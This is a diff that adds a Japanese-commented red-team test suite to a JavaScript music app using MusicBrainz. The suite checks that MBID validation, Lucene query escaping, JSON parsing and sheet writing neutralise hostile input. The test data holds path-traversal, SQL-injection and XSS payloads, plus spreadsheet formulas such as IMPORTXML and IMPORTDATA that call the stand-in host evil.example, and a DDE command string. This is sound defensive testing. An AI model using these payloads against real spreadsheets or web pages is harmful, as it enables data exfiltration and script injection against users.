@@ -1081,6 +1081,198 @@ recordResult('Store: 他のアルバムデータが破損せず維持されて�
 
 
 // -----------------------------------------------------------------------------
+// [TEST SUITE 6] MusicBrainz 統合検索・Lookup レッドチーム破壊的テスト
+// -----------------------------------------------------------------------------
+console.log('\n>>> [6] MusicBrainz 統合検索・Lookup レッドチーム破壊的テスト');
+
+const MusicBrainzService = require('../src/MusicBrainzService');
+
+// 6.1 MBID インジェクション・パストラバーサル攻撃耐性
+console.log('\n>>> [6.1] MBID インジェクション・パストラバーサル攻撃耐性');
+let mbHttpCalledOnInvalid = false;
+global.UrlFetchApp = {
+  fetch: () => {
+    mbHttpCalledOnInvalid = true;
+    throw new Error('Should not execute HTTP request on invalid MBID');
+  }
+};
+const rtMbConfig = {
+  isMusicBrainzEnabled: () => true,
+  getMusicBrainzUserAgent: () => 'MusicInfoApp/1.1.0 (https://example.com)'
+};
+const rtMbService = new MusicBrainzService(rtMbConfig);
+const rtMusicServiceWithMb = new MusicService(mockConfig, mockSheetService, mockDriveService, mockItunesService, rtMbService);
+
+const maliciousMbids = [
+  '../../admin',
+  'f5093c06-23e3-404f-aeaa-40f72885ee3a?inc=aliases+annotation',
+  'f5093c06-23e3-404f-aeaa-40f72885ee3a#fragment',
+  '12345',
+  '',
+  null,
+  undefined,
+  "'; DROP TABLE releases; --",
+  'f5093c06-23e3-404f-aeaa-40f72885ee3g' // non-hex 'g'
+];
+
+let allMaliciousMbidsBlocked = true;
+for (const badMbid of maliciousMbids) {
+  let blocked = false;
+  try {
+    rtMusicServiceWithMb.lookupMusicBrainzRelease(badMbid);
+  } catch (e) {
+    blocked = e.message.includes('MBID');
+  }
+  if (!blocked) {
+    allMaliciousMbidsBlocked = false;
+  }
+}
+recordResult('MBID 検証: 全ての不正・パストラバーサル・パラメータ汚染 MBID を事前遮断', allMaliciousMbidsBlocked, '一部の不正 MBID が通過した', 'CRITICAL');
+recordResult('MBID 検証: 不正 MBID 時に外部 HTTP 通信が一切発生しない', !mbHttpCalledOnInvalid, '不正 MBID で UrlFetchApp.fetch が呼ばれた', 'CRITICAL');
+
+// 6.2 Lucene クエリ構文インジェクション耐性
+console.log('\n>>> [6.2] Lucene クエリ構文インジェクション耐性');
+const lucenePayloads = [
+  'test AND *:*',
+  'artist:"evil"~10',
+  '[1 TO 999999]',
+  '{a TO z}',
+  '(foo OR bar)^999',
+  '\\+\\-\\!\\(\\)\\{\\}\\[\\]\\^\\"\\~\\*\\?\\:\\/\\\\'
+];
+let luceneSanitizedOk = true;
+for (const payload of lucenePayloads) {
+  const sanitized = rtMbService.sanitizeSearchQuery(payload);
+  // エスケープされていない単独の * や ? や [ ] が残っていないか確認
+  if (/(?<!\\)[\+\-\!\(\)\{\}\[\]\^\"\~\*\?\:\/]/.test(sanitized)) {
+    luceneSanitizedOk = false;
+  }
+}
+recordResult('Lucene サニタイズ: 全ての構文メタ文字がバックスラッシュで無害化される', luceneSanitizedOk, '未エスケープのメタ文字が残存', 'HIGH');
+
+// 6.3 悪意ある MusicBrainz JSON ペイロード（XSS / 数式インジェクション / 空オブジェクト欠損）
+console.log('\n>>> [6.3] 悪意ある MusicBrainz JSON レスポンス & スプレッドシート数式インジェクション防御');
+const maliciousMbSearchJson = JSON.stringify({
+  releases: [
+    {}, // 完全空オブジェクト
+    {
+      id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
+      title: '=IMPORTXML("http://evil.example/leak","//a")',
+      score: 100,
+      country: '<script>alert(1)</script>',
+      date: '2025-05',
+      disambiguation: '"><img src=x onerror=alert(1)>',
+      'artist-credit': [
+        { name: '+SUM(1,1)', joinphrase: ' & ' },
+        { artist: { name: '<svg onload=alert(2)>' } }
+      ],
+      'label-info': [
+        {},
+        { label: { name: '-cmd|\'/C calc\'!A0' } }
+      ],
+      media: [
+        {},
+        { format: '<iframe src="javascript:alert(3)">', 'track-count': 2 }
+      ]
+    }
+  ]
+});
+
+let parsedMaliciousSearch = null;
+let maliciousSearchNoCrash = false;
+try {
+  parsedMaliciousSearch = rtMbService.parseSearchResponse({
+    getResponseCode: () => 200,
+    getContentText: () => maliciousMbSearchJson
+  });
+  maliciousSearchNoCrash = Array.isArray(parsedMaliciousSearch) && parsedMaliciousSearch.length === 1;
+} catch (e) {
+  maliciousSearchNoCrash = false;
+}
+recordResult('MB 異常 JSON パース: 空オブジェクト混在・悪意ある文字列でもクラッシュせず有効分のみ抽出', maliciousSearchNoCrash, 'parseSearchResponse が例外をスローしたか不正 ID を通した', 'HIGH');
+
+// Lookup レスポンスの欠損・数式インジェクション耐性からの saveAlbumBatch 連携検証
+global.UrlFetchApp = {
+  fetch: () => ({
+    getResponseCode: () => 200,
+    getAllHeaders: () => ({}),
+    getContentText: () => JSON.stringify({
+      id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
+      title: '=IMPORTDATA("http://evil.example/csv")',
+      date: '2025',
+      'artist-credit': [{ name: '@SUM(A1:A10)' }],
+      media: [
+        {}, // tracks 欠損
+        {
+          position: 1,
+          format: 'CD<script>',
+          tracks: [
+            {}, // 空トラック (position 1 にフォールバック)
+            {
+              position: 2,
+              title: '=HYPERLINK("http://evil.example","Click")',
+              'artist-credit': [{ name: '-1+1' }]
+            }
+          ]
+        }
+      ]
+    })
+  })
+};
+
+let lookupAndSaveSafe = false;
+try {
+  const lookupRes = rtMusicServiceWithMb.lookupMusicBrainzRelease('a1b2c3d4-e5f6-7890-abcd-ef1234567890');
+  const detail = lookupRes.albumDetail;
+  // SheetService の実際のセル変換ロジックを通す
+  let writtenRows = null;
+  const mockSheetForMb = {
+    getLastRow: () => 1,
+    getRange: (r, c, numR, numC) => ({
+      setNumberFormat: () => {},
+      setValues: (rows) => { writtenRows = rows; }
+    })
+  };
+  const realSheetServiceForMb = new SheetService({ getSheetName: () => 'Tracks' });
+  realSheetServiceForMb.getOrCreateSheet = () => mockSheetForMb;
+  realSheetServiceForMb.insertTracksBatch(
+    detail.tracks,
+    {
+      albumArtist: detail.albumArtist,
+      albumName: detail.albumName,
+      releaseDate: detail.releaseDate
+    },
+    'https://coverartarchive.org/release/a1b2c3d4-e5f6-7890-abcd-ef1234567890/front-500'
+  );
+  // 2行目 (tracks[1]: 悪意ある数式入りトラック) の全テキスト列 (=, +, -, @ 始まり) の先頭にシングルクォートが付与されているか検証
+  const rowMalicious = writtenRows[1];
+  lookupAndSaveSafe =
+    Array.isArray(writtenRows) &&
+    writtenRows.length === 2 &&
+    rowMalicious[1].startsWith("'@") && // albumArtist: '@SUM(A1:A10)'
+    rowMalicious[2].startsWith("'=") && // albumName: '=IMPORTDATA(...)'
+    rowMalicious[3].startsWith("'-") && // trackArtist: '-1+1'
+    rowMalicious[5].startsWith("'=") && // trackName: '=HYPERLINK(...)'
+    rowMalicious[6] === '2025';         // 部分日付 YYYY がそのまま保持される
+} catch (e) {
+  lookupAndSaveSafe = false;
+}
+recordResult('MB Lookup -> SheetService 保存: 数式インジェクション文字列が無害化され部分日付が保持される', lookupAndSaveSafe, '数式インジェクション防御または部分日付保持に失敗', 'CRITICAL');
+
+// 6.4 フロントエンド XSS 防止検証（インライン onerror 排除・MB メタ情報の escapeHtml）
+console.log('\n>>> [6.4] フロントエンド XSS 防止検証 (renderItunesResults)');
+const hasNoInlineOnerror = !appContent.includes('onerror="');
+recordResult('ScriptsApp: インライン onerror 属性が存在しない（プログラマティック image.onerror バインド）', hasNoInlineOnerror, 'インライン onerror 属性が残存している', 'HIGH');
+
+const escapesMbMeta =
+  appContent.includes('Utils.escapeHtml(String(item.extra.format))') &&
+  appContent.includes('Utils.escapeHtml(String(item.extra.country))') &&
+  appContent.includes('Utils.escapeHtml(String(item.extra.label))') &&
+  appContent.includes('Utils.escapeHtml(String(item.extra.disambiguation))');
+recordResult('ScriptsApp: MusicBrainz 固有メタ情報 (format/country/label/disambiguation) が全て escapeHtml されている', escapesMbMeta, '未エスケープの MB メタ情報出力が存在する', 'HIGH');
+
+
+// -----------------------------------------------------------------------------
 // 結果サマリー
 // -----------------------------------------------------------------------------
 console.log('\n================================================================');
